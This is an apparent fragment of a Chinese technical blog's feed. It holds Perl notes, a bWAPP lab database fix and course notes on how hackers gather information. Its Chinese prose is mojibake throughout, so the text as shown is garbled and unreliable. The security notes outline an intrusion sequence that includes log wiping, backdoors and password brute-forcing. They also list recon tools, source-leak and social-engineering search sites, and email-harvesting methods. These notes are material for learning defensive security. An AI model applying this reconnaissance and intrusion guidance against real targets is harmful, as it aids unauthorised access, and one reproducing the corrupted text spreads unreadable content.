ä¹Ÿå¯æ¶ˆé™¤æ­§ä¹‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $value = $items<span class="hljs-string">&#123;shift&#125;</span>;<br><br><span class="hljs-keyword">my</span> $value = $items&#123;<span class="hljs-keyword">shift</span> @_&#125;;<br><br><span class="hljs-comment"># æ¶ˆé™¤æ­§ä¹‰</span><br><span class="hljs-keyword">my</span> $value = $items&#123;+<span class="hljs-keyword">shift</span>&#125;;<br></code></pre></td></tr></table></figure><p>ç”¨ <code>constant</code> ç¼–è¯‘å‘½ä»¤å®šä¹‰çš„å¸¸é‡å¯ä»¥æŒ‰è£¸å­—ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> constant <span class="hljs-string">NAME =&gt;</span> <span class="hljs-string">&#x27;Bucky&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="è£¸å­—çš„æ¬ è€ƒè™‘ä½¿ç”¨"><a href="#è£¸å­—çš„æ¬ è€ƒè™‘ä½¿ç”¨" class="headerlink" title="è£¸å­—çš„æ¬ è€ƒè™‘ä½¿ç”¨"></a>è£¸å­—çš„æ¬ è€ƒè™‘ä½¿ç”¨</h3><p>æ²¡æœ‰å¯ç”¨ <code>strict &#39;subs&#39;</code> è€Œç¼–å†™çš„ä»£ç å¯ä»¥ä½¿ç”¨è£¸å­—å‡½æ•°å.</p><p>å†…ç½®çš„ <code>sort</code> æ“ä½œç¬¦ä»¥ç¬¬äºŒå‚æ•°çš„å½¢å¼æ¥å—ä¸€ä¸ªç”¨äºæ’åºçš„å‡½æ•°å, ä½œä¸ºä»£æ›¿, æä¾›ä¸€ä¸ªç”¨äºæ’åº<mark>å‡½æ•°å¼•ç”¨</mark> å¯ä»¥é¿å…ä½¿ç”¨è£¸å­—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># ä¸è‰¯ç”¨æ³•</span><br><span class="hljs-keyword">my</span> @sorted = <span class="hljs-keyword">sort</span> compare_lengths @unsorted;<br><br><span class="hljs-comment"># æ›´å¥½çš„é£æ ¼</span><br><span class="hljs-keyword">my</span> $comparison = \&amp;compare_lengths;<br><span class="hljs-keyword">my</span> @sorted = <span class="hljs-keyword">sort</span> $comparison @unsorted;<br></code></pre></td></tr></table></figure><p>Perl 5 è¯­æ³•è§£æå™¨å¹¶ä¸ç†è§£å•è¡Œç‰ˆæœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @sorted = <span class="hljs-keyword">sort</span> \&amp;compare_lengths @unsorted;<br></code></pre></td></tr></table></figure><h3 id="é—´æ¥å¯¹è±¡"><a href="#é—´æ¥å¯¹è±¡" class="headerlink" title="é—´æ¥å¯¹è±¡"></a>é—´æ¥å¯¹è±¡</h3><p>Perl 5 ä¸­çš„<mark>æ„é€ å™¨</mark>å°±æ˜¯ä»»ä½•è¿”å›å¯¹è±¡çš„ä¸œè¥¿.</p><p>ä¸€èˆ¬å°†æ„é€ å™¨å‡½æ•°å‘½åä¸º <code>new</code>, é¿å…æ­§ä¹‰çš„å†™æ³•ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $q = CGI-&gt;new();<br></code></pre></td></tr></table></figure><h3 id="é—´æ¥è®°æ³•çš„æ ‡é‡é™åˆ¶"><a href="#é—´æ¥è®°æ³•çš„æ ‡é‡é™åˆ¶" class="headerlink" title="é—´æ¥è®°æ³•çš„æ ‡é‡é™åˆ¶"></a>é—´æ¥è®°æ³•çš„æ ‡é‡é™åˆ¶</h3><p><code>IO::Handle</code> æ ¸å¿ƒæ¨¡å—, å…¶å…è®¸ä½ è°ƒç”¨æ–‡ä»¶å¥æŸ„å¯¹è±¡ä¸Šçš„æ–¹æ³•æ¥æ‰§è¡Œ IO æ“ä½œ.</p><h2 id="åŸå‹"><a href="#åŸå‹" class="headerlink" title="åŸå‹"></a>åŸå‹</h2><p><mark>åŸå‹ (prototype)</mark> æ˜¯ä¸€å—é™„åŠ åœ¨å‡½æ•°ç”Ÿå‘½ä¸Šçš„å¯é€‰å…ƒæ•°æ®.</p><p>ä¸¤ä¸ªç›®çš„:</p><ul><li>ç»™äºˆè¯­æ³•åˆ†æå™¨æç¤ºæ¥æ”¹å˜å¯¹å‡½æ•°åŠå…¶å‚æ•°çš„è¯­æ³•åˆ†æ</li><li>ä¿®æ”¹äº† Perl 5 å¤„ç†å‡½æ•°å‚æ•°çš„æ–¹å¼</li></ul><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">foo</span></span>     (&amp;@);<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">bar</span>     ($$) </span>&#123; ... &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">foo</span>(&amp;@) </span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‹¬å·å†…çš„ä»£è¡¨å‚æ•°å†…å®¹, <code>&amp;</code> è¡¨ç¤ºæ¥å—ä¸€ä¸ªä»£ç å—, <code>@</code> è¡¨ç¤ºæ¥å—ä¸€ä¸ªåˆ—è¡¨, <code>$</code> è¡¨ç¤ºæ¥å—ä¸€ä¸ªæ ‡é‡.</p><p>è¯¥åŸå‹å¿…é¡»å®Œæ•´åœ°å‡ºç°åœ¨å‡½æ•°å£°æ˜ä¸­.</p><p>åŸå‹æœ€åˆçš„ç›®çš„æ˜¯å…è®¸ç”¨æˆ·å®šä¹‰å®ƒä»¬è‡ªå·±çš„å‡½æ•°, è¿™äº›å‡½æ•°çš„è¡Œä¸ºå’Œ (ä¸€äº›) å†…ç½®æ“ä½œç¬¦ä¸€æ ·.</p><p>å†…ç½®æ“ä½œç¬¦ <code>prototype</code> æ¥å—ä¸€ä¸ªå‡½æ•°åç§°å¹¶è¿”å›ä»£è¡¨å…¶åŸå‹çš„å­—ç¬¦ä¸²:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -E <span class="hljs-string">&quot;say prototype &#x27;CORE::push&#x27; // &#x27;undef&#x27;;&quot;</span><br>\@@<br>$ perl -E <span class="hljs-string">&quot;say prototype &#x27;CORE::keys&#x27; // &#x27;undef&#x27;;&quot;</span><br>\%<br></code></pre></td></tr></table></figure><p>ä¸€äº›å†…ç½®æ“ä½œç¬¦æ‹¥æœ‰ä½ æ— æ³•æ¨¡æ‹Ÿçš„åŸå‹.</p><p>å¯¹äº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -E <span class="hljs-string">&quot;say prototype &#x27;CORE::push&#x27; // &#x27;undef&#x27;;&quot;</span><br>\@@<br></code></pre></td></tr></table></figure><p>çš„å«ä¹‰.</p><p><code>@</code> å­—ç¬¦ä»£è¡¨ä¸€ä¸ªåˆ—è¡¨, åæ–œæ å¼ºåˆ¶å¯¹å¯¹åº”çš„å‚æ•°è¿›è¡Œå¼•ç”¨, å› æ­¤è¿™ä¸ªå‡½æ•°æ¥å—ä¸€ä¸ªæ•°ç»„å¼•ç”¨å’Œä¸€åˆ—å€¼.</p><p>å¯å‚è€ƒ <code>perldoc perlsub</code> æ–‡æ¡£.</p><h3 id="åŸå‹çš„é—®é¢˜"><a href="#åŸå‹çš„é—®é¢˜" class="headerlink" title="åŸå‹çš„é—®é¢˜"></a>åŸå‹çš„é—®é¢˜</h3><p>åŸå‹å¯ä»¥æ”¹å˜åç»­ä»£ç çš„è¯­æ³•åˆ†æè€Œä¸”ä»–ä»¬ä¼šå¯¹å‚æ•°è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢.</p><p>åŸå‹å¯¹å‚æ•°çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥ä¸€ç§éšæ™¦çš„æ–¹å¼å‘ç”Ÿ, å¦‚åœ¨ä¼ å…¥å‚æ•°ä¸Šå¼ºåˆ¶æ ‡é‡ä¸Šä¸‹æ–‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">numeric_equality</span>($$) </span>&#123;<br>    <span class="hljs-keyword">my</span> ($left, $right) = @_;<br>    <span class="hljs-keyword">return</span> $left == $right;<br>&#125;<br><br><span class="hljs-keyword">my</span> @nums = <span class="hljs-number">1</span> .. <span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;They&#x27;re equal, whatever that means!&quot;</span> <span class="hljs-keyword">if</span> numeric_equality(@nums, <span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><p>çœ‹ä¸Šè¿°ä»£ç å¯çŸ¥.</p><h3 id="åŸå‹çš„æ­£å½“ä½¿ç”¨"><a href="#åŸå‹çš„æ­£å½“ä½¿ç”¨" class="headerlink" title="åŸå‹çš„æ­£å½“ä½¿ç”¨"></a>åŸå‹çš„æ­£å½“ä½¿ç”¨</h3><p><mark>ç†ç”±ä¸€</mark>: ç”¨äºè¦†ç›–å†…ç½®å…³é”®å­—æ¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°, éœ€è¦å…ˆç”¨ <code>prototype</code> æ¥ç¡®è®¤æœ‰æ²¡æœ‰è¿”å› <code>undef</code> æ¥æ£€æŸ¥æ˜¯å¦å¯ä»¥è¦†ç›–å†…ç½®å…³é”®å­—, è¿”å› <code>undef</code> åˆ™ä¸èƒ½.</p><p>çŸ¥é“äº†å…³é”®å­—çš„åŸå‹, å°±å¯ä»¥å£°æ˜å’Œæ ¸å¿ƒå…³é”®å­—åŒåçš„å‰ç½®å®šä¹‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> subs <span class="hljs-string">&#x27;push&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">push</span>(\@@) </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p><mark>ç†ç”±äºŒ</mark>: å®šä¹‰ç¼–è¯‘å™¨å¸¸æ•°: ä¸€ä¸ªç”± <mark>ç©ºåŸå‹</mark> å£°æ˜ä¸”æ±‚å€¼å¾—å•ä¸ªè¡¨è¾¾å¼çš„å‡½æ•°å°†æˆä¸ºå¸¸æ•°è€Œéå‡½æ•°è°ƒç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">PI</span>() </span>&#123; <span class="hljs-number">4</span> * <span class="hljs-keyword">atan2</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) &#125;<br></code></pre></td></tr></table></figure><p>æ¯•ç«Ÿæ­¤æ—¶ä¼ å…¥å‚æ•°å°±ä¼šæŠ¥é”™.</p><p>CPAN çš„ <code>Readonly</code> æ¨¡å—å¯ä»¥å°†å¸¸é‡å†…æ’å…¥å­—ç¬¦ä¸².</p><p><mark>ç†ç”±ä¸‰</mark>: è§ä¹¦.</p><h2 id="æ–¹æ³•-å‡½æ•°ç­‰ä»·"><a href="#æ–¹æ³•-å‡½æ•°ç­‰ä»·" class="headerlink" title="æ–¹æ³•-å‡½æ•°ç­‰ä»·"></a>æ–¹æ³•-å‡½æ•°ç­‰ä»·</h2><p>Perl è‡ªèº«ä¸å¯¹å­˜å‚¨äºåŒ…ä¸­çš„å‡½æ•°å’Œå­˜å‚¨äºåŒ…ä¸­çš„æ–¹æ³•åŠ ä»¥å¼ºåˆ¶åŒºåˆ†.</p><p>å¦‚æœä½ è¯•ç€å°†å‡½æ•°ä½œä¸ºæ–¹æ³•è°ƒç”¨, Perl è‡ªèº«å°†æŠŠä»»ä½•èƒ½æ‰¾åˆ°çš„æ‹¥æœ‰åˆé€‚åç§°, å¤„äºåˆé€‚åŒ…ä¸­çš„å‡½æ•°å½“ä½œæ–¹æ³•.</p><h3 id="è°ƒç”¨æ–¹-Caller-side"><a href="#è°ƒç”¨æ–¹-Caller-side" class="headerlink" title="è°ƒç”¨æ–¹ (Caller-side)"></a>è°ƒç”¨æ–¹ (Caller-side)</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;apply_discount&#x27;</span>;<br>$o-&gt;$name();<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯è¿è¡Œ.</p><h3 id="è¢«è°ƒç”¨æ–¹-Callee-side"><a href="#è¢«è°ƒç”¨æ–¹-Callee-side" class="headerlink" title="è¢«è°ƒç”¨æ–¹ (Callee-side)"></a>è¢«è°ƒç”¨æ–¹ (Callee-side)</h3><h2 id="æ†ç»‘-Tie"><a href="#æ†ç»‘-Tie" class="headerlink" title="æ†ç»‘ (Tie)"></a>æ†ç»‘ (Tie)</h2><p>ä½¿ç”¨ <code>tie</code> å…³é”®å­—. å¯æŸ¥çœ‹ <code>perldoc perltie</code> æ–‡æ¡£.</p><p>è¿™ä¸ªä¸»é¢˜å…ˆè§å…¶ä»–ä¹¦.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenVPN-ä½¿ç”¨</title>
    <link href="/2023/01/17/OpenVPN-%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/01/17/OpenVPN-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="OpenVPN-è¯ä¹¦åˆ¶ä½œ"><a href="#OpenVPN-è¯ä¹¦åˆ¶ä½œ" class="headerlink" title="OpenVPN è¯ä¹¦åˆ¶ä½œ"></a>OpenVPN è¯ä¹¦åˆ¶ä½œ</h1><p>OpenVPN é€šè¿‡è¯ä¹¦æ¥è¯†åˆ«æœ‰æ•ˆç”¨æˆ·, è€Œä¸æ˜¯é€šè¿‡è´¦æˆ·å’Œå¯†ç . </p><p>éœ€è¦è¯ä¹¦åˆ¶ä½œå·¥å…·.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-ä¸­çš„-bless-å’Œå¯¹è±¡</title>
    <link href="/2023/01/14/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E7%9A%84-bless-%E5%92%8C%E5%AF%B9%E8%B1%A1/"/>
    <url>/2023/01/14/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E7%9A%84-bless-%E5%92%8C%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<p><code>bless</code> ä¼šåˆ›å»ºä¸€ä¸ªåç§°ç©ºé—´. å¯ä»¥å°†ä¸€ä¸ªå¼•ç”¨ä¸è¿™ä¸ªåç§°ç©ºé—´ç»‘å®š, ä½†è¿™ä¸ªå¼•ç”¨å¹¶ä¸ä¼šå‡ºç°åœ¨è¿™ä¸ªåç§°ç©ºé—´çš„ç¬¦å·è¡¨ä¸­. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $test = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">my</span> $test_ref = \$test;<br><br><span class="hljs-keyword">bless</span> $test_ref, <span class="hljs-string">&#x27;Test&#x27;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">keys</span> (%main::Test::);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç¬¦å·è¡¨ä¸­ä¸ä¼šæœ‰è¾“å‡º.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-btrfs</title>
    <link href="/2023/01/12/%E4%BB%80%E4%B9%88%E6%98%AF-btrfs/"/>
    <url>/2023/01/12/%E4%BB%80%E4%B9%88%E6%98%AF-btrfs/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-Unknown-database-bwapp-é—®é¢˜</title>
    <link href="/2023/01/11/%E8%A7%A3%E5%86%B3-Unknown-database-bwapp-%E9%97%AE%E9%A2%98/"/>
    <url>/2023/01/11/%E8%A7%A3%E5%86%B3-Unknown-database-bwapp-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/73014996/unknown-database-bwapp">å‚è€ƒ</a></p><p>åŸå› æ˜¯ mysql ç‰ˆæœ¬ä¸å…¼å®¹, å…·ä½“åŸå› æˆ‘ä¹Ÿä¸äº†è§£, è§£å†³åŠæ³•ä¸º:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mysql<br>&gt; CREATE DATABASE IF NOT EXISTS bWAPP;<br></code></pre></td></tr></table></figure><p>ç„¶åå†è®¿é—®å³å¯.</p>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æœ¬åœ°æ–‡ä»¶</title>
    <link href="/2023/01/10/Linux-%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/"/>
    <url>/2023/01/10/Linux-%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>è®¿é—® url å¦‚: <code>file:///home/jie/Disk/Gitrepo/mybgd/bus.png</code> å³å¯.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œå®‰å…¨-B-ç«™æ•™ç¨‹2</title>
    <link href="/2023/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-B-%E7%AB%99%E6%95%99%E7%A8%8B2/"/>
    <url>/2023/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-B-%E7%AB%99%E6%95%99%E7%A8%8B2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1xY411U7dN?p=3&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><h1 id="é»‘å®¢å…¥ä¾µæµç¨‹å’Œä¿¡æ¯æ”¶é›†"><a href="#é»‘å®¢å…¥ä¾µæµç¨‹å’Œä¿¡æ¯æ”¶é›†" class="headerlink" title="é»‘å®¢å…¥ä¾µæµç¨‹å’Œä¿¡æ¯æ”¶é›†"></a>é»‘å®¢å…¥ä¾µæµç¨‹å’Œä¿¡æ¯æ”¶é›†</h1><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><p>ä¸€äº›ç½‘ç«™ä¿¡æ¯, <code>whois</code> ä¿¡æ¯.</p><p>SSL è¯ä¹¦çš„æ”¶é›†.</p><p>å¼€æ”¾ç«¯å£æ¢æµ‹.</p><p>ç½‘ç«™æ¶æ„. æµè§ˆå™¨æ’ä»¶æŸ¥æ‰¾.</p><p>æ•æ„Ÿæ–‡ä»¶, ç›®å½•æ¢æµ‹.</p><p>ç¤¾äº¤ç½‘ç«™&#x2F;å¹³å°.</p><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>è¸©ç‚¹ -&gt; æ‰«æ -&gt; æŸ¥ç‚¹ -&gt; è®¿é—® -&gt; ææƒ -&gt; çªƒå–ä¿¡æ¯ -&gt; æ©ç›–è¸ªè¿¹ -&gt; åˆ›å»ºåé—¨ -&gt; æ‹’ç»æœåŠ¡</p><h2 id="æŠ€æœ¯"><a href="#æŠ€æœ¯" class="headerlink" title="æŠ€æœ¯"></a>æŠ€æœ¯</h2><p>å‘½ä»¤å¦‚, <code>whoami</code>, <code>ping</code>, <code>SNMP</code></p><p>å¯†ç å—…æ¢. å¯†ç çˆ†ç ´.</p><p>æ—¥å¿—åˆ é™¤. æ¸…é™¤è®¿é—®æ—¥å¿—.</p><p>æµæ°“å·¥å…·, æ¥å¼€åé—¨.</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><p>Kali Linux ä¸‹çš„è‡ªå¸¦å·¥å…·é›†.</p><p>å‘½ä»¤å¦‚: <code>dig</code>, <code>dnsmap</code>, <code>nslookup</code>, <code>ping</code>, <code>fping</code>, <code>nmap</code>, <code>AutoScan</code>, <code>amap</code>, <code>meta</code>, <code>python</code>, å­—å…¸, DDos å·¥å…·.</p><p><img src="/../img/tools_and_skills.png"></p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å…ˆç”¨æ‰«æå™¨æ‰«æ. å¦‚:</p><ul><li>IBM, AppScan</li><li>HP, WebInspect </li><li>å¯æ˜æ˜Ÿè¾°, å¤©é•œ</li><li>å®‰æ’, æ˜é‰´</li><li>ç»¿ç›Ÿ, WVSS&#x2F;RSAS</li><li>å…¶ä»–, Nmap ç­‰</li></ul><p>DNS ä¼ é€æ¼æ´ (åŸŸåæ¢æµ‹è¿‡ç¨‹).</p><p><mark>åŸŸåæ”¶é›†</mark> æ ¹æ®ä¸»åŸŸå, å¯ä»¥è·å¾—äºŒæ, ä¸‰çº§åŸŸå. å¯ä»¥é€šè¿‡ Kali å†…ç½®çš„ <code>dnsenum</code>. ä½¿ç”¨å¦‚:</p><ul><li><code>-f</code>, æŒ‡å®šä¸€ä¸ªæ–‡ä»¶, å¦‚ <code>dns.txt</code> (å­—å…¸çˆ†ç ´)</li><li><code>--dnsserver</code>, æŒ‡å®šåŸŸåè§£ææœåŠ¡å™¨, å¦‚ <code>114.114.114.114</code>.</li></ul><p>é€šè¿‡åŸŸåä¿¡æ¯, å¯ä»¥æ¨æ–­å‡ºä¸€äº›å¼€æ”¾çš„ç«¯å£ä¿¡æ¯. ä»¥åŠä¸€äº› DNS æ³¨å†Œä¿¡æ¯.</p><p>æ­£å‘è§£æ, åŸŸåæ‰¾ IP.</p><p>åå‘è§£æ, IP æ‰¾åŸŸå. å¯é€šè¿‡ <code>dig</code>, æˆ– <code>nslookup</code> ç­‰å‘½ä»¤.</p><p><code>whois</code> å‘½ä»¤å¯ä»¥ç”¨æ¥è·å–æ³¨å†Œä¿¡æ¯, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ whois test.com<br>$ dig @114.114.114.114 test.com<br></code></pre></td></tr></table></figure><p><mark>ç½‘ç«™å¤‡æ¡ˆä¿¡æ¯æ”¶é›†</mark> , å¦‚é€šè¿‡ <code>www.beianbeian.com</code> ç½‘ç«™.</p><p><mark>SSL è¯ä¹¦æ”¶é›†</mark>, å¦‚é€šè¿‡ <code>https://myssl.com/ssl.html</code></p><p><mark>APP ä¿¡æ¯æå–</mark> , å¦‚é€šè¿‡æŠ“åŒ…, åç¼–è¯‘, æš´åŠ›ç ´è§£ å·¥å…·å¦‚ demon.</p><p><mark>DNS æ›´æ–°è®°å½•æ”¶é›†</mark>, å¦‚è®¿é—® <code>www.dnsdb.io</code></p><p><mark>ç¬¬ä¸‰æ–¹ç½‘ç«™çš„æ”¶é›†æ“ä½œ</mark>, å¤©çœ¼æŸ¥, å¨èƒæƒ…æŠ¥ç½‘ç«™, æ¼æ´é“¶è¡Œ, é’Ÿé¦—ä¹‹çœ¼, 360 è¡¥å¤©, å¾®æ­¥åœ¨çº¿.</p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†-Web-æºä»£ç æ³„æ¼"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†-Web-æºä»£ç æ³„æ¼" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†, Web æºä»£ç æ³„æ¼"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†, Web æºä»£ç æ³„æ¼</h1><p>Web æºä»£ç æ³„æ¼, å¦‚:</p><ul><li>git æºç æ³„æ¼</li><li>svn æºç æ³„æ¼</li><li>DS_Store æ–‡ä»¶æ³„æ¼</li><li>WBE-INF&#x2F;web.xml æ³„æ¼</li><li>ç½‘ç»œå¤‡ä»½æ–‡ä»¶æ³„æ¼ </li><li>github æ³„æ¼</li></ul><p>å‰åç«¯åˆ†ç¦»é¡¹ç›®, æ¥å£ä¿¡æ¯æ³„æ¼, ä¸”æ¥å£æœªä½œé™åˆ¶.</p><p>åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦.</p><p>ç™¾åº¦ç½‘ç›˜, ä¿¡æ¯æ”¶é›†. <code>pan.baidu.com</code></p><p>å°ç±³çš„å¯¼èˆªé¡µé¢: <code>https://sec.xiaomi.com/friends</code></p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†å·¥å…·æ±‡æ€»"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†å·¥å…·æ±‡æ€»" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†å·¥å…·æ±‡æ€»"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†å·¥å…·æ±‡æ€»</h1><p>ç½‘ç›˜æœç´¢: <code>www.pansou.com</code></p><p>ç¤¾å·¥æ³„æ¼: <code>www.uneihan.com</code></p><p>æºç æœç´¢: <code>searchcode.com</code>, <code>gitee.com</code>, <code>gitcafe.com</code>, <code>code.csdn.net</code>, <code>é’Ÿé¦—ä¹‹çœ¼</code>, <code>å¤©çœ¼æŸ¥</code></p><p>è·å–åˆ°çš„é‚®ç®±è´¦å·å¯ä»¥ç”¨æ¥æ¨æµ‹é‚®ç®±çš„å‘½åè§„åˆ™. å¯ä»¥ç”¨æ¥åæœŸç™»é™†å­ç³»ç»Ÿ. ä¹Ÿå¯ä»¥ç”¨æ¥çˆ†ç ´å¯†ç . å¼±å£ä»¤, å¯ä»¥é€šè¿‡æ‰‹å·¥ä¹Ÿå¯ä»¥é€šè¿‡å·¥å…·æ”¶é›†.</p><p>å†…ç½‘æ”»å‡», ç½‘ç«™åŠ«æŒ.</p><p><mark>é‚®ç®±æ”¶é›†å·¥å…·</mark>: theHarvester.</p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†-å†å²æ¼æ´æ”¶é›†-å·¥å…·ä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†-å†å²æ¼æ´æ”¶é›†-å·¥å…·ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†, å†å²æ¼æ´æ”¶é›†+å·¥å…·ä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†, å†å²æ¼æ´æ”¶é›†+å·¥å…·ä¿¡æ¯æ”¶é›†</h1><p>å†å²ä¿¡æ¯æ”¶é›†, å¦‚:</p><ul><li>360 è¡¥å¤©.</li><li>æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å° â€“ <code>src.edu-info.edu.cn</code></li></ul><p>å·¥å…·ä¿¡æ¯æ”¶é›†, å¦‚:</p><ul><li>7Kbscan</li></ul><h1 id="æŒ‡çº¹è¯†åˆ«-WAF-CDN-è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«-WAF-CDN-è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«, WAF, CDN è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«, WAF, CDN 